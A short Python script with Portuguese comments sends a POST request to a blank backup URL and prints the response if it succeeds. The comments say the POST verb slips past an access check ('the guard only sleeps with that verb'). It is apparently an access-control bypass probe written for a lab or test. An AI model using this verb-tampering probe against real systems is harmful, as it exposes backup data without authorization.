import requests

# Agora apontamos para a subpasta que você achou
url_backup = ""

print(f"[*] Tentando abrir o cofre via POST em: {url_backup}")

# Usamos POST porque o vigia só dorme com esse verbo
res = requests.post(url_backup)

if res.status_code == 200:
    print("[!!!] CONTEÚDO DO BACKUP EXPOSTO:")
    print(res.text)
else:
    print(f"[-] O vigia acordou. Status: {res.status_code}")
